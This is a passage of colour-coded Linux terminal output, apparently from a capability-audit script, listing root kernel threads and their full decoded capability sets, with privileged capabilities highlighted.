  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 14 (rcu_sched) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 15 (migration/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 16 (idle_inject/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 18 (cpuhp/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 19 (cpuhp/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 20 (idle_inject/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 21 (migration/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 22 (ksoftirqd/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 24 (kworker/1:0H-events_highpri) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
